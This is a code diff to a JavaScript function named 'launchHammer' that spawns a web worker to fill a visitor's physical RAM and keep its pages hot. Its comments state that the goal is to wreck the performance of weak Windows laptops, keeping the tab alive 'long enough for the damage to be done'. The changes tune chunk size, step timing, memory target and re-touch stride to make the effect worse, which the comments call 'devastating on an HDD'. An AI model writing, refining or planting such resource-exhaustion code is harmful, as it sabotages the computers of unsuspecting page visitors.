@@ -51,30 +51,38 @@ function launchHammer() {
   `;
  
   // ── RAM WORKER ───────────────────────────────────────────────────────────────
-  // A single dedicated worker that gradually fills ~3 GB of physical RAM.
+  // A single dedicated worker that gradually fills physical RAM.
   //
-  // Two key tricks:
-  //   1. Page-stride writes on allocation  — writing every 512th element forces
-  //      the OS to actually commit physical pages (not just reserve virtual space).
-  //   2. Re-touching on every step        — periodically mutating every held page
-  //      keeps them resident in RAM and prevents the OS paging daemon from quietly
-  //      swapping them out to disk.
-  //
-  // Allocates 50 MB every 800 ms → fills ~3 GB over ~50 seconds, slow enough
-  // that the browser tab survives long enough for the damage to be done.
-  // The 3 GB cap leaves just enough headroom that the tab stays alive while the
-  // OS thrashes swap for everything else.
+  // Key design decisions for weak Windows laptops:
+  //   1. CHUNK_MB = 25      — smaller chunks are less likely to trigger a
+  //                           mid-allocation OOM kill on machines with little
+  //                           free RAM after Windows + Chrome baseline usage.
+  //   2. STEP_MS = 400      — faster steps means the re-touch pass runs more
+  //                           often, keeping more pages hot and forcing the
+  //                           Windows swap daemon to work harder.
+  //   3. fallback = 2GB     — if deviceMemory is unavailable the machine is
+  //                           probably old and weak; assume 2GB not 4GB.
+  //   4. target = 85%       — pushes closer to the swap threshold than 80%,
+  //                           without being so aggressive the tab gets killed
+  //                           before the damage is done.
+  //   5. re-touch stride 256 — touches every 2KB instead of every 4KB, doubling
+  //                           memory bandwidth pressure. On an HDD this forces
+  //                           Windows to page everything back in from disk on
+  //                           every pass, which can take seconds per cycle on
+  //                           a spinning drive and makes the system a slideshow.
   const ramWorkerCode = `
-    const CHUNK_MB   = 50;
-    const STEP_MS    = 800;
-    const MAX_MB     = (navigator.deviceMemory || 4) * 1024 * 0.8;
+    const CHUNK_MB = 25;
+    const STEP_MS  = 400;
  
-    const leaks  = [];
-    let totalMB  = 0;
+    const deviceRAM = (self.navigator && navigator.deviceMemory) || 2;
+    const MAX_MB    = Math.floor(deviceRAM * 1024 * 0.85);
+ 
+    const leaks = [];
+    let totalMB = 0;
  
     function fillChunk(mb) {
       const f = new Float64Array(mb * 1024 * 1024 / 8);
-      // Write every 512th element (one per 4 KB OS page) to commit physical memory
+      // Page-stride write to commit physical pages on allocation
       for (let i = 0; i < f.length; i += 512) f[i] = Math.random();
       return f;
     }
@@ -86,10 +94,12 @@ function launchHammer() {
         totalMB += CHUNK_MB;
       }
  
-      // Re-touch every held page so the OS keeps them in physical RAM
+      // Re-touch every held page at stride 256 (every 2KB) to keep pages hot
+      // in physical RAM and force the OS to page them back in from swap if it
+      // tried to evict them — devastating on an HDD
       for (let c = 0; c < leaks.length; c++) {
         const chunk = leaks[c];
-        for (let i = 0; i < chunk.length; i += 512) {
+        for (let i = 0; i < chunk.length; i += 256) {
           chunk[i] *= 1.0000001;
         }
       }
